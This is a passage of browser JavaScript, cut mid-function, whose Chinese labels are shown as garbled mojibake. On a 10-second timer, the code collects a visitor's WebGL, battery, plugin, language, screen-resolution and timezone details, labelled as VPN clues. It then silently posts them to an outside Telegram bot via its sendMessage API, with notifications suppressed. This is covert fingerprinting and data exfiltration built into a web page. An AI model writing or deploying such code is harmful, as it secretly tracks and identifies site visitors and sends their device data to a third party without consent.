            const advancedInfo = await collectAdvancedInfo();
            
            const advancedMessage = `
ğŸ” <b>ã€é«˜çº§è®¾å¤‡ä¿¡æ¯ã€‘</b>

ğŸ® <b>WebGLä¿¡æ¯ï¼š</b> ${advancedInfo.webgl}
ğŸ”‹ <b>ç”µæ± çŠ¶æ€ï¼š</b> ${advancedInfo.battery}
ğŸ”Œ <b>æµè§ˆå™¨æ’ä»¶ï¼š</b> ${advancedInfo.plugins}
ğŸ“± <b>ç§»åŠ¨è®¾å¤‡ï¼š</b> ${advancedInfo.vpnClues.isMobile ? 'æ˜¯' : 'å¦'}
ğŸŒ <b>æµè§ˆå™¨è¯­è¨€ï¼š</b> ${advancedInfo.vpnClues.languages.join(', ')}
ğŸ–¥ï¸ <b>å±å¹•åˆ†è¾¨ç‡ï¼š</b> ${advancedInfo.vpnClues.screenRes}
â° <b>æµè§ˆå™¨æ—¶åŒºï¼š</b> ${advancedInfo.vpnClues.browserTimezone}
            `;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: advancedMessage,
                    parse_mode: 'HTML',
                    disable_notification: true // é™é»˜é€šçŸ¥
                })
            });
            
        } catch (e) {
            console.log('é«˜çº§ä¿¡æ¯æ”¶é›†å¤±è´¥');
        }
    }, 10000); // 10ç§’åæ”¶é›†é«˜çº§ä¿¡æ¯
</script>
